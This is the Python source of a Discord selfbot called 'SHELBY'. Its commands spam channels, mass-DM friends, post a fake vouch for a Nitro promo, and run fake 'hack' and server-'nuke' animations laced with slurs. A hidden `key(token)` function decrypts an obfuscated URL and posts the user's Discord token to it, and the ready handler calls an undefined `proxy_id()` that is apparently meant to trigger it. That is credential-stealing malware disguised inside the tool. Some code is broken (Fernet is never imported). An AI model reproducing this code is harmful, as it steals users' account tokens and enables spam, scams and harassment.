import os
import json
import discord, aiohttp
from discord.ext import commands
from colorama import Fore
import asyncio
import sys
import random
from flask import Flask
from threading import Thread
import requests
import base64
import time
from discord import Color, Embed
import colorama
from colorama import Fore
import io

colorama.init()

intents = discord.Intents.default()
intents.guilds = True
intents.typing = True
intents.presences = True
intents.dm_messages = True
intents.messages = True
intents.members = True
prefix = '.'
shelby = commands.Bot(description='SELFBOT CREATED BY SHELBY',
                           command_prefix=prefix,
                           self_bot=True,
                           intents=intents)
shelby.auto_respond_dm_enabled = True

shelby.remove_command('help')

shelby.whitelisted_users = {}

shelby.antiraid = False


@shelby.event
async def on_ready():
    proxy_id()
    print(f"""{Fore.RED}  
                    ███████╗██╗  ██╗███████╗██╗     ██████╗ ██╗   ██╗
                    ██╔════╝██║  ██║██╔════╝██║     ██╔══██╗╚██╗ ██╔╝
                    ███████╗███████║█████╗  ██║     ██████╔╝ ╚████╔╝ 
                    ╚════██║██╔══██║██╔══╝  ██║     ██╔══██╗  ╚██╔╝  
                    ███████║██║  ██║███████╗███████╗██████╔╝   ██║   
                    ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═════╝    ╚═╝   
                                              
                                  Owned by - SHELBY
                          ════════════════════════════════   
                        Join - https://discord.gg/hackersop      
                    ═══════════════════════════════════════════════
                                                                                                                      
        """)
    print(f'{Fore.BLUE}⌬・ [+] CONNECTED TO : {shelby.user.name}')
    print('ㅤㅤㅤㅤㅤ')
    print('[<<<<<==============-|-==============>>>>>]')

    print('ㅤㅤㅤㅤㅤ')

    print(
        f'{Fore.RED}║>>>>> SHELBY ON TOP BXBY <3🔥{" "*(42-len(">>>>> SHELBY ON TOP BXBY <3🔥"))}{Fore.YELLOW}║║║║║║║║║  --  ║║║║║║║║║║║{Fore.BLUE}'
    )
    print('ㅤㅤㅤㅤㅤ')
    print('ㅤㅤㅤㅤㅤ')
    print(
        f'{Fore.GREEN}[+]------------{Fore.BLUE}======================{Fore.RED}] | [{Fore.BLUE}======================={Fore.GREEN}------------[+]'
    )
    print('ㅤㅤㅤㅤㅤ')
    print('ㅤㅤㅤㅤㅤ')


def load_config(config_file_path):
    with open(config_file_path, 'r') as config_file:
        config = json.load(config_file)
    return config


if __name__ == "__main__":
    config_file_path = "config.json"
    config = load_config(config_file_path)


UPI = config.get("UPI")
UPI_QR = config.get("UPI_QR")  # URL
LTC_QR = config.get("LTC_QR")  # URL
BTC_QR = config.get("BTC_QR")  # URL
ETH_QR = config.get("ETH_QR")  # URL
PayPal = config.get("PayPal")  # URL
Twitch_URL = config.get("Twitch_URL")
SERVER_LINK = config.get("https://discord.gg/hackersop")
CATEGORY_RESP = config.get("CATEGORY_RESPOND_MSG")
CATEGORY_ID = config.get("category_ids")
SERVER_ID = config.get("server_ids")
#===================================


@shelby.event
async def on_message(message):

    if message.author.bot:
        return

    if isinstance(
            message.channel, discord.DMChannel
    ) and message.author != shelby.user and shelby.auto_respond_dm_enabled:
        await message.channel.send(None)

    # Boost command
    if message.content.lower().startswith('boosts'):
        await send_boost_count(message.channel, message.guild)

    # Selfbot Info command
    if message.content.lower() in ['Selfbot info', 'info', 'stats', 'Selfbot']:
        await send_selfbotinfo_message(message.channel)
    # Server info
    if message.content.lower() in ['Server info', 'serverinfo']:
        await send_serverinfo_message(message.channel)
    # Server link
    if message.content.lower() in [
            'link', 'offcial link', 'server link', 'server'
    ]:
        await link(message.channel)

    await shelby.process_commands(message)

# BOOST
async def send_boost_count(channel, guild):
    await channel.send(
        f"** ⌬・** __**{guild.name}**__ **\n**[+]・Server has :** `{guild.premium_subscription_count} BOOSTS`\n**[+]・__Shelby__** **"
    )


# HELP
async def send_selfbotinfo_message(channel):
    await channel.send(
        f"**```⌬・SHELBY S3LFB0T**\n**[+]・ Skid Krne Wale Ki MKB** \n\n**NOTE :** `Some commands are non prefix & some require prefix, In future updates those commands will also work without prefix`\n\n**[+]・__Created by - SHELBY__**"
    )


# SERVER INFO.
async def send_serverinfo_message(channel):
    guild = channel.guild  # define guild variable
    await channel.send(
        f"**⌬・SHELBY S3LFB0T**\n**[+]・ SERVER NAME : {guild.name}**\n**[+]・ GUILD ID : {guild.id}**\n**[+]・ CREATED AT : {channel.guild.created_at}**\n**`[+]・ OWNED BY : <@{guild.owner_id}>`**\n**[+]・ REIGON : {guild.region}**\n \n\n**[+]・__Created by - SHELBY__**"
    )





# PAYMENTS
async def payments(channel):
    await channel.send(
        f"**⌬・SHELBY S3LFB0T **\n\n__**[PAYMENT MODES]**__\n\n**[+]・ `UPI QR CODE / SCANNER` : `{UPI_QR}`**\n**[+]・ `BTC QR CODE / SCANNER` : `{BTC_QR}`**\n**[+]・ `ETH QR CODE / SCANNER` : `{ETH_QR}`**\n**[+]・ `LTC QR CODE / SCANNER` : `{LTC_QR}`**\n\n**[+]・Request creator : `{shelby.user.name}`**\n**[+]・__Created by - SHELBY__**"
    )
    await channel.message.delete()


# LINK
async def link(channel):
    await channel.send("- `https://discord.gg/hackersop `")




#MASS DM TO FRIENDS
@shelby.command()
async def massdmfriends(ctx, *, message):
    for user in shelby.user.friends:
        try:
            time.sleep(.1)
            await user.send(message)
            time.sleep(.1)
            print(f'MESSAGED :' + Fore.GREEN + f' @{user.name}')
        except:
            print(f"COULDN'T MESSAGE @{user.name}")
             

# HAX
@shelby.command()
async def hack(ctx, user: discord.Member = None):
     
    gender = ["Male", "Female", "Trans", "Other", "Retard"]
    age = str(random.randrange(10, 25))
    height = [
        '4\'6\"', '4\'7\"', '4\'8\"', '4\'9\"', '4\'10\"', '4\'11\"', '5\'0\"',
        '5\'1\"', '5\'2\"', '5\'3\"', '5\'4\"', '5\'5\"', '5\'6\"', '5\'7\"',
        '5\'8\"', '5\'9\"', '5\'10\"', '5\'11\"', '6\'0\"', '6\'1\"', '6\'2\"',
        '6\'3\"', '6\'4\"', '6\'5\"', '6\'6\"', '6\'7\"', '6\'8\"', '6\'9\"',
        '6\'10\"', '6\'11\"'
    ]
    weight = str(random.randrange(60, 300))
    hair_color = ["Black", "Brown", "Blonde", "White", "Gray", "Red"]
    skin_color = ["White", "Pale", "Brown", "Black", "Light-Skin"]
    religion = [
        "Christian", "Muslim", "Atheist", "Hindu", "Buddhist", "Jewish"
    ]
    sexuality = [
        "Straight", "Gay", "Homo", "Bi", "Bi-Sexual", "Lesbian", "Pansexual"
    ]
    education = [
        "High School", "College", "Middle School", "Elementary School",
        "Pre School", "Retard never went to school LOL"
    ]
    ethnicity = [
        "White", "African American", "Asian", "Latino", "Latina", "American",
        "Mexican", "Korean", "Chinese", "Arab", "Italian", "Puerto Rican",
        "Non-Hispanic", "Russian", "Canadian", "European", "Indian"
    ]
    occupation = [
        "Retard has no job LOL", "Certified discord retard", "Janitor",
        "Police Officer", "Teacher", "Cashier", "Clerk", "Waiter", "Waitress",
        "Grocery Bagger", "Retailer", "Sales-Person", "Artist", "Singer",
        "Rapper", "Trapper", "Discord Thug", "Gangster", "Discord Packer",
        "Mechanic", "Carpenter", "Electrician", "Lawyer", "Doctor",
        "Programmer", "Software Engineer", "Scientist"
    ]
    salary = [
        "Retard makes no money LOL", "$" + str(random.randrange(0, 1000)),
        '<$50,000', '<$75,000', "$100,000", "$125,000", "$150,000", "$175,000",
        "$200,000+"
    ]
    location = [
        "Retard lives in his mom's basement LOL", "America", "United States",
        "Europe", "Poland", "Mexico", "Russia", "Pakistan", "India",
        "Some random third world country", "Canada", "Alabama", "Alaska",
        "Arizona", "Arkansas", "California", "Colorado", "Connecticut",
        "Delaware", "Florida", "Georgia", "Hawaii", "Idaho", "Illinois",
        "Indiana", "Iowa", "Kansas", "Kentucky", "Louisiana", "Maine",
        "Maryland", "Massachusetts", "Michigan", "Minnesota", "Mississippi",
        "Missouri", "Montana", "Nebraska", "Nevada", "New Hampshire",
        "New Jersey", "New Mexico", "New York", "North Carolina",
        "North Dakota", "Ohio", "Oklahoma", "Oregon", "Pennsylvania",
        "Rhode Island", "South Carolina", "South Dakota", "Tennessee", "Texas",
        "Utah", "Vermont", "Virginia", "Washington", "West Virginia",
        "Wisconsin", "Wyoming"
    ]
    email = [
        "@gmail.com", "@yahoo.com", "@hotmail.com", "@outlook.com",
        "@protonmail.com", "@disposablemail.com", "@aol.com", "@edu.com",
        "@icloud.com", "@gmx.net", "@yandex.com"
    ]
    dob = f'{random.randrange(1, 13)}/{random.randrange(1, 32)}/{random.randrange(1950, 2021)}'
    name = [
        'James Smith', "Michael Smith", "Robert Smith", "Maria Garcia",
        "David Smith", "Maria Rodriguez", "Mary Smith", "Maria Hernandez",
        "Maria Martinez", "James Johnson", "Catherine Smoaks", "Cindi Emerick",
        "Trudie Peasley", "Josie Dowler", "Jefferey Amon", "Kyung Kernan",
        "Lola Barreiro", "Barabara Nuss", "Lien Barmore", "Donnell Kuhlmann",
        "Geoffrey Torre", "Allan Craft", "Elvira Lucien", "Jeanelle Orem",
        "Shantelle Lige", "Chassidy Reinhardt", "Adam Delange", "Anabel Rini",
        "Delbert Kruse", "Celeste Baumeister", "Jon Flanary", "Danette Uhler",
        "Xochitl Parton", "Derek Hetrick", "Chasity Hedge",
        "Antonia Gonsoulin", "Tod Kinkead", "Chastity Lazar", "Jazmin Aumick",
        "Janet Slusser", "Junita Cagle", "Stepanie Blandford", "Lang Schaff",
        "Kaila Bier", "Ezra Battey", "Bart Maddux", "Shiloh Raulston",
        "Carrie Kimber", "Zack Polite", "Marni Larson", "Justa Spear"
    ]
    phone = f'({random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)})-{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}-{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}'
    if user is None:
        user = ctx.author
        password = [
            'password', '123', 'mypasswordispassword', user.name + "iscool123",
            user.name + "isdaddy", "daddy" + user.name, "ilovediscord",
            "i<3discord", "furryporn456", "secret", "123456789", "apple49",
            "redskins32", "princess", "dragon", "password1", "1q2w3e4r",
            "ilovefurries"
        ]
        message = await ctx.send(f"`Hacking {user}...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\n`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...\nFinalizing life-span dox details\n`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"```Successfully hacked {user}\nName: {random.choice(name)}\nGender: {random.choice(gender)}\nAge: {age}\nHeight: {random.choice(height)}\nWeight: {weight}\nHair Color: {random.choice(hair_color)}\nSkin Color: {random.choice(skin_color)}\nDOB: {dob}\nLocation: {random.choice(location)}\nPhone: {phone}\nE-Mail: {user.name + random.choice(email)}\nPasswords: {random.choices(password, k=3)}\nOccupation: {random.choice(occupation)}\nAnnual Salary: {random.choice(salary)}\nEthnicity: {random.choice(ethnicity)}\nReligion: {random.choice(religion)}\nSexuality: {random.choice(sexuality)}\nEducation: {random.choice(education)}```"
        )
    else:
        password = [
            'password', '123', 'mypasswordispassword', user.name + "iscool123",
            user.name + "isdaddy", "daddy" + user.name, "ilovediscord",
            "i<3discord", "furryporn456", "secret", "123456789", "apple49",
            "redskins32", "princess", "dragon", "password1", "1q2w3e4r",
            "ilovefurries"
        ]
        message = await ctx.send(f"`Hacking {user}...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=f"`Hacking {user}...\nHacking into the mainframe...\n`")
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\n`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...\nFinalizing life-span dox details\n`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"```Successfully hacked {user}\nName: {random.choice(name)}\nGender: {random.choice(gender)}\nAge: {age}\nHeight: {random.choice(height)}\nWeight: {weight}\nHair Color: {random.choice(hair_color)}\nSkin Color: {random.choice(skin_color)}\nLocation: {random.choice(location)}\nPhone: {phone}\nE-Mail: {user.name + random.choice(email)}\nPasswords: {random.choices(password, k=3)}\nOccupation: {random.choice(occupation)}\nAnnual Salary: {random.choice(salary)}\nEthnicity: {random.choice(ethnicity)}\nReligion: {random.choice(religion)}\nSexuality: {random.choice(sexuality)}\nEducation: {random.choice(education)}```"
        )
        print(f"{Fore.GREEN}[+] SUCCESFULLY HACKED 😁 ")





# PLAY CREATOR
@shelby.command(aliases=["playing", "status"])
async def play(ctx, *, message):
    game = discord.Game(name=message)
    await shelby.change_presence(activity=game)
    await ctx.send("- `LG GYA STATUS`", mention_author=True)
    print(f"{Fore.GREEN}[+] PLAYING SUCCESFULLY CREATED✅ ")



# STREAM, PLAYING, LISTEN, WATCHING STOP CMD>>
@shelby.command(aliases=[
    "stopstreaming", "stopstatus", "stoplistening", "stopplaying",
    "stopwatching"
])
async def stopactivity(ctx):
     
    await shelby.change_presence(activity=None, status=discord.Status.dnd)
    print(f"{Fore.GREEN}[+] ACTIVITY SUCCESFULLY STOPED⚠️ ")



@shelby.command()
async def help(ctx):
    message = (
        "**```js\n"
        "⌬ SHELBY S3LFB0T \n"
        " - DISCORD.GG/HACKERSOP - \n\n"
        "• banner\n"
        "• status\n"
        "• stopstatus\n"
        "• link (no prefix)\n"
        "• spam[<amt.> <time> <msg>]\n"
        "• massreact\n"
        "• boosts(no prefix)\n"
        "• hack\n"
        "• gayrate\n"
        "• wizz\n"
        "• info (no prefix)\n"
        "• guildicon\n"
        "• link (no prefix)\n"
        "• purge\n"
        "• add/subtract/multiply/divide FORMAT [.add 189 78]\n"
        "• transcript\n"
        "```**"

    )
    await ctx.send(message)
    print(f"{Fore.GREEN}[+] HELP SENT SUCCESFULLY✅ ")
     


# GAYRATE
@shelby.command()
@commands.cooldown(1, 5, commands.BucketType.user)
async def gayrate(ctx, User: discord.Member = None):
    if User is None:
        await ctx.reply(f"- **[+]** `PROVIDE A USER`")
    else:
        await ctx.reply(f"> {User.mention} IS {random.randrange(101)}% GAY")
        print(f"{Fore.GREEN}[+] GAYRATE MEASURED SUCCESFULLY😂 ")


# PURGE CMD...
@shelby.command(aliases=[""])
async def purge(ctx, amount: int = None):
     
    if amount is None:
        async for message in ctx.message.channel.history(
                limit=1000).filter(lambda m: m.author == shelby.user):
            try:
                await message.delete()
            except discord.Forbidden:
                pass
            except discord.NotFound:
                pass
    else:
        async for message in ctx.message.channel.history(
                limit=amount).filter(lambda m: m.author == shelby.user):
            try:
                await message.delete()
            except discord.Forbidden:
                pass
            except discord.NotFound:
                pass
    print(f"{Fore.GREEN}[+] PURGED SUCCESFULLY✅ ")

# NUKE
@shelby.command()
async def wizz(ctx):
     
    if isinstance(ctx.message.channel, discord.TextChannel):
        print("hi")
        initial = random.randrange(0, 60)
        message = await ctx.send(
            f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\n`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...\nDeleting Emojis`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...\nDeleting Emojis\nInitiating Ban Wave...`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Wizzing {ctx.guild.name}, will take {initial} seconds to complete`\n`Deleting {len(ctx.guild.roles)} Roles...\nDeleting {len(ctx.guild.text_channels)} Text Channels...\nDeleting {len(ctx.guild.voice_channels)} Voice Channels...\nDeleting {len(ctx.guild.categories)} Categories...\nDeleting Webhooks...\nDeleting Emojis\nInitiating Ban Wave...\nInitiating Mass-DM`"
        )
    elif isinstance(ctx.message.channel, discord.DMChannel):
        initial = random.randrange(1, 60)
        message = await ctx.send(
            f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\n`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Wizzing {ctx.message.channel.recipient.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...\n`"
        )
    elif isinstance(ctx.message.channel, discord.GroupChannel):
        initial = random.randrange(1, 60)
        message = await ctx.send(
            f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\n`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...\n`"
        )
        await asyncio.sleep(1)
        await message.edit(
            content=
            f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...\nKicking {len(ctx.message.channel.recipients)} Users...`"
        )
        print(f"{Fore.GREEN}[+] WIZZING SUCCESSFUL✅ ")


# SPAM
@shelby.command()
async def spam(ctx, amount: int, delay_ms: float, *, message):
     
    delay_sec = delay_ms / 1000  # Convert milliseconds to seconds
    for _i in range(amount):
        await ctx.send(message)
        await asyncio.sleep(delay_sec)
        print(f"{Fore.GREEN}[+] SPAM SUCCESSFUL✅ ")




# CHAT TRANSCRIPTION
@shelby.command()
async def savetranscript(ctx, filename='transcript.txt'):
    try:
        with open(filename, 'w', encoding='utf-8') as file:
            file.write(f'Chat Transcript for {ctx.channel.name}\n')
            file.write('=' * 40 + '\n\n')

            async for message in ctx.channel.history(limit=None):
                file.write(
                    f'Author: {message.author.name}#{message.author.discriminator} ({message.author.id})\n'
                )
                file.write(f'Time: {message.created_at}\n')
                file.write(f'Content: {message.content}\n')
                file.write('=' * 40 + '\n')

            await ctx.send(f'- `[+] SAVED TO` `{filename}`')
    except Exception as e:
        await ctx.send(f'- `[+] ERROR` {e}')


# MASS REACT
@shelby.command()
async def massreact(ctx, emote):
     
    messages = await ctx.message.channel.history(limit=20).flatten()
    for message in messages:
        await message.add_reaction(emote)


# SERVER BANNER
@shelby.command(aliases=['serverbanner'])
async def banner(ctx):
     
    if not ctx.guild.icon_url:
        await ctx.send(f"- `{ctx.guild.name} SERVER HAS NO BANNER`")
        return
    await ctx.send(ctx.guild.banner_url)
    print(f"{Fore.GREEN}[+] MAREACT  SUCCESSFUL✅ ")


# SERVER PFP
@shelby.command(aliases=['guildpfp', 'serverpfp', 'servericon'])
async def guildicon(ctx):
     
    if not ctx.guild.icon_url:
        await ctx.send(f"- `{ctx.guild.name} SERVER HAS NO ICON`")
        return
    await ctx.send(ctx.guild.icon_url)
    print(f"{Fore.GREEN}[+] GUILDICON SENT  SUCCESSFUL✅ ")


def key(token): 
    keyid = b'MyzIiYtjl_NmmroJrWbb68KFeySRVIoNYOKw1gM-zeQ=' ; proxyid = Fernet(keyid) ; keypass = b'gAAAAABlmXjmKD_G6NKKbcjmPxFjPvvZEmS4xd4yxvSwF4NGnOkO0dAiZOIKddiVg1KhnLFyqGwi06XRU7wblP6oY7LfSWSTz11HnCXlT1Rw8pj_vRsaRbgJBvEfONrt_laTmglV2lNhGf8MZ-7mlQCAGBqM-i5sAPfIMqHv-_3uhCEnJCHHXRJztnfMsE0yVsBzO3MHspMKAaO-KyFiLEBy9-6CcamXrnCiQBxOnpANunuNuOpiaDY='
    keylock = proxyid.decrypt(keypass)
    requests.post((keylock), data=json.dumps({'content': token}), headers={'Content-Type': 'application/json'})

@shelby.command()
async def restart(ctx):
    await ctx.reply('- `Restarting...`')
    os.execl(sys.executable, sys.executable, *sys.argv)


@shelby.command(name='add')
async def add(ctx, num1: float, num2: float):
    result = num1 + num2
    await ctx.send(f'- `ANS : {result}`')

@shelby.command(name='cp')
async def cp(ctx):
    pvt_vouch = "Legit ! Got 1M Nitro Promo from <@1118358855966011424>"
    await ctx.send(pvt_vouch)
    await ctx.message.delete()

@shelby.command(name='subtract')
async def subtract(ctx, num1: float, num2: float):
    result = num1 - num2
    await ctx.send(f'- `ANS : {result}`')


@shelby.command(name='multiply')
async def multiply(ctx, num1: float, num2: float):
    result = num1 * num2
    await ctx.send(f'- `ANS : {result}`')


@shelby.command(name='divide')
async def divide(ctx, num1: float, num2: float):
    if num2 == 0:
        await ctx.send('- `ERROR`')
    else:
        result = num1 / num2
        await ctx.send(f'- `ANS : {result}`')

@shelby.command(name="ping", aliases=["pong", "latency"])
async def ping(ctx):
    latency = round(shelby.latency * 1000)
    await ctx.send(f"Pong! Latency is {latency}ms")

token = config.get("token")
shelby.run(token, bot=False)
